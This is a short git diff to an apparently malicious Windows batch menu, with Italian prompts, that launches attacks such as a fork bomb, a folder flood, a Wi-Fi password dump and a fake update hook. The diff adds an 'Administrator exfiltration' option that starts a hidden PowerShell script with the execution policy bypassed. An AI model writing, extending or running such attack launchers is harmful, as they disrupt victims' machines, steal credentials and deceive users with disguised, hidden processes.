@@ -22,7 +22,8 @@ echo [2] Folders Flood
 echo [3] Fork Bomb
 echo [4] Desktop madness
 echo [5] Wi-Fi passworld dump
-echo [6] Update-Hook	
+echo [6] Update-Hook
+echo [7] Administrator exfiltration 
 SET /P ANSWER=Attacco desiderato? 
 echo Hai scelto: %ANSWER%
 echo.
@@ -32,6 +33,7 @@ IF "%ANSWER%"=="3" goto :b
 IF "%ANSWER%"=="4" goto :getdesktopname
 IF "%ANSWER%"=="5" goto :wifi
 IF "%ANSWER%"=="6" goto :fakeupdate
+IF "%ANSWER%"=="7" goto :admin
 pause
 echo Scelta non valida.
 goto :start
@@ -73,6 +75,10 @@ goto:nome
 
 :fakeupdate
 start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "fakeupdate.ps1"
+goto:end
+
+:admin
+start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "amministratore.ps1"
 goto:end
 
 :end  
